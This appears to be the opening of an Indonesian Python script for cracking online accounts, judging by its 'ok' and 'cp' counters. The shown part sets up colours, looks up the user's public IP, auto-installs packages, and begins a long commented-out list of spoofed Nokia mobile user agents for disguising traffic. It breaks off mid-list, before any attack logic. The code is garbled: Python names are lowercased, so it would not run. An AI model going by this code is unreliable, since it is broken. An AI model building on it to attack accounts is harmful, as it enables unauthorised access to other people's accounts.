# rekod mulu anying
# coded by hakiki xf.
# py 
import os,sys,re,json,random,requests,time,uuid
from time import sleep as waktu
from shutil import rmtree as hapus
from concurrent.futures import threadpoolexecutor as bool
durasi = "2021"
ip = requests.get("https://api.ipify.org").text
b='\033[1;94m'

i='\033[1;92m'

c='\033[1;96m'

m='\033[1;91m'

u='\033[1;95m'

k='\033[1;93m'

p='\033[1;97m'

h='\033[1;90m'

p = '\x1b[1;97m' # putih

p = '\x1b[1;97m' # putih

m = '\x1b[1;91m' # merah 

h = '\x1b[1;92m' # hijau

k = '\x1b[1;93m' # kuning

b = '\x1b[1;94m' # biru

u = '\x1b[1;95m' # ungu

o = '\x1b[1;96m' # biru muda

n = '\x1b[0m'    # warna mati
ok=0
cp=0
cot=0
live=[]
chek=[]
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try: import requests as req
except modulenotfounderror: os.system("python -m pip install requests");restart()
try: from bs4 import beautifulsoup as parser
except modulenotfounderror: os.system("python -m pip install bs4");restart()
#ua_=random.choice(["mozilla/5.0 (symbianos/9.4; series60/5.0 nokia5800d-1/60.0.003; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokiax2-02/10.90; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/1.0.2.26.11", "mozilla/5.0 (symbian/3; series60/5.3 nokiae7-00/111.040.1511; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/535.1 (khtml, like gecko) nokiabrowser/8.3.1.4 mobile safari/535.1", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokia5230/51.0.002; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (symbian/3; series60/5.3 nokiac6-01/111.040.1511; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/535.1 (khtml, like gecko) nokiabrowser/8.3.1.4 mobile safari/535.1", "mozilla/5.0 (series40; nokia205.1/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia303/14.87; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (symbian/3; series60/5.3 nokia500/111.021.0028; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/535.1 (khtml, like gecko) nokiabrowser/8.3.1.4 mobile safari/535.1", "mozilla/5.0 (series40; nokia110/03.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.62.10", "mozilla/5.0 (series40; nokia501/1.0; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.0.0.0.67", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia205/03.18; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokiac5-06/23.6.015; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia208/03.39; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia205/03.19; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia205.1/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia201/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokia2700c-2/07.80; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia200/10.61; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia206/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia205/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia201/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.2.0.0.6", "mozilla/5.0 (series40; nokia501/14.0.4/java_runtime_version=nokia_asha_1_2; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia205.3/03.19; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.1.62.6", "mozilla/5.0 (series40; nokia303/14.87; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia114/03.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia311/03.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.31", "mozilla/5.0 (series40; nokia2051/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia201/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (symbian/3; series60/5.3 nokian8-00/111.040.1511; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/535.1 (khtml, like gecko) nokiabrowser/8.3.1.4 mobile safari/535.1", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokia5233/51.1.002; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokia206/04.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia206/04.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia5130c-2/07.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia305/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/10.61; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia206/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia110/03.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokiax2-02/11.84; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia2055/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia112/03.28; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia110/03.33; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokiax2-02/10.91; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia110/03.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia210/04.12; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/12.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia306/05.93; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia206/03.59; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.2.0.0.6", "mozilla/5.0 (series40; nokia308/05.85; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia202/20.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.1.62.6", "mozilla/5.0 (series40; nokia210.2/06.09; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokiax2-01/08.70; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokiac2-02/07.48; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia305/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia311/07.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokiax2-00/04.80; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia305/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia205/03.18; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia302/14.53; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia110/03.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.54", "mozilla/5.0 (series40; nokia302/14.78; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokiax2-02/11.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia112/03.32; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokiac2-00/03.82; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1","mozilla/5.0 (series40; nokia2055/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokiac5-03/21.0.003; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.30 mobile safari/533.4 3gpp-gba", "mozilla/5.0 (linux; android 4.1.2; nokia_x build/jzo54k) applewebkit/537.36 (khtml, like gecko) chrome/30.0.1599.82 mobile safari/537.36 nokiabrowser/1.0.1.54", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokiax6-00/40.0.002; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokiax2-01/08.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokiax2-02/11.79; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia110/03.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia206/03.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (symbianos/9.4; series60/5.0 nokiac5-05/23.5.015; profile/midp-2.1 configuration/cldc-1.1 ) applewebkit/533.4 (khtml, like gecko) nokiabrowser/7.3.1.33 mobile safari/533.4", "mozilla/5.0 (series40; nokia311/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia302/14.78; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia302/15.15; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia200/12.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.2.0.0.6", "mozilla/5.0 (series40; nokia205/03.19; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac2-03/07.48; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia202/20.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.1.0.0.62", "mozilla/5.0 (series40; nokia205/03.18; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.1.0.0.62", "mozilla/5.0 (series40; nokia311/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia311/03.90; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia202/20.28; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.2.0.0.6", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia112/03.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia206/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia202/20.28; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac2-03/07.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/04.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.55", "mozilla/5.0 (series40; nokiac2-02/07.66; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia206/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/10.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/1.0.2.26.11", "mozilla/5.0 (series40; nokia114/03.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia202/20.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/04.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia305/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia112/03.26; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia114/03.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia305/07.42; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax3-02.5/06.75; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia305/03.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/10.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/04.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia311/07.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokiac2-06/07.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia309/05.85; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia305/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.2.0.0.6", "mozilla/5.0 (series40; nokia202/20.36; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax2-02/11.84; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac2-06/07.57; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokiac2-06/07.48; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/03.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia210/04.12; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/03.59; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokiac2-02/06.96; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.64; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia308/05.85; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.7.0.0.11", "mozilla/5.0 (series40; nokia311/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia302/14.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.1.0.1", "mozilla/5.0 (series40; nokia306/03.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia111/03.32; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac2-06/07.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia301/09.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokiac2-03/06.96; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/03.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia205.1/03.18; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia111/03.32; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokiac2-03/07.29; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia114/03.47; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiaasha230dualsim/14.0.4/java_runtime_version=nokia_asha_1_2; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.30", "mozilla/5.0 (series40; nokia208.4/04.06; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/12.04; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia203/20.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia114/03.33; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia308/08.13; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiax3-02/le6.32; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.62.10", "mozilla/5.0 (series40; nokia210/06.09; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia206/03.59; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia208/03.39; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia206/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/11.95; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia311/05.92; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiac2-06/07.63; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia302/14.78; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiac2-03/07.65; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/3.9.0.0.22", "mozilla/5.0 (series40; nokia200/11.56; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokiac2-03/07.48a; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia205/04.51; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac2-00/03.99; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia202/20.28; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia309/08.22; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac2-06/07.29; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia5130c-2/07.97; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia112/03.32; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokiac2-03/07.48; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia203/20.52; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia308/07.55; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia114/03.33; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia301.1/08.02; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.0.2.68.14", "mozilla/5.0 (series40; nokia206/03.59; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.49", "mozilla/5.0 (series40; nokia200/10.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/11.81; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia2051/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia206/03.58; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.2.0.0.36", "mozilla/5.0 (series40; nokia2055/03.20; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia515.2/05.08; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/2.3.0.0.55", "mozilla/5.0 (series40; nokiax2-02/11.84; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia200/11.64; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.5.0.0.27", "mozilla/5.0 (series40; nokia305/03.60; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia203/20.26; profile/midp-2.1 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/5.0.0.0.31", "mozilla/5.0 (series40; nokia311/07.36; profile/midp-1.2 configuration/cldc-1.1) gecko/20100401 s40ovibrowser/4.0.0.0.45", "mozilla/5.0 (series40; nokia306/07.42; 